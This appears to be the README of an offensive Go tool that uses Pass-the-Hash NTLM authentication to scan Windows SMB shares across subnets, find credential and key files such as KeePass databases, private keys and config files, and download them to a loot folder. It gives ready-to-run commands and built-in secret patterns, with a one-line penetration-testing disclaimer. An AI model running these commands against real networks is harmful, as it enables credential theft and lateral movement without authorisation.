# Taraqan

Credential and sensitive file hunter for Windows networks. Scans SMB shares using Pass-the-Hash authentication and searches for files matching patterns (passwords, keys, configs, credentials).

## Features

- Pass-the-Hash authentication (NTLM)
- Subnet scanning with CIDR notation
- Pattern-based sensitive file detection  
- Automatic file download (loot)
- Multi-threaded scanning
- Built-in patterns for common secrets

## Installation

```bash
git clone https://github.com/but43r/Taraqan.git
cd Taraqan
go build -o taraqan -ldflags="-s -w" .
```

Cross-compile for Linux:
```bash
GOOS=linux GOARCH=amd64 go build -o taraqan -ldflags="-s -w" .
```

## Usage

```bash
# Hunt for secrets using PTH
./taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Download found files
./taraqan -t 10.1.2.3 -u admin -d DOMAIN -H hash \
  --patterns "*.kdbx,*password*" --download -v

# Password auth
./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123"

# Export results
./taraqan -t 10.0.0.0/24 -u admin -H hash -o results.json
```

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | - | Target IP or CIDR (required) |
| `-u, --username` | - | Username (required) |
| `-d, --domain` | `.` | Domain name |
| `-H, --hash` | - | NT hash for PTH |
| `-p, --password` | - | Password |
| `--patterns` | built-in | Patterns file or comma-separated list |
| `--threads` | 10 | Host scan threads |
| `--share-threads` | 3 | Share threads per host |
| `--share-timeout` | 2m | Timeout per share |
| `--depth` | 5 | Max directory depth |
| `--download` | off | Download matched files |
| `--download-dir` | ./loot | Download directory |
| `--max-size` | 10 | Max download size (MB) |
| `--skip-admin` | off | Skip admin shares |
| `-o, --output` | - | Output file path |
| `--format` | json | Output format (json/csv) |
| `-v, --verbose` | off | Verbose output |

## Built-in Patterns

- Credentials: `*password*`, `*credential*`, `*secret*`
- Key files: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
- Configs: `web.config`, `.env`, `appsettings.json`
- Remote access: `*.rdp`, `ultravnc.ini`

## Disclaimer

For authorized penetration testing only.

## License

MIT
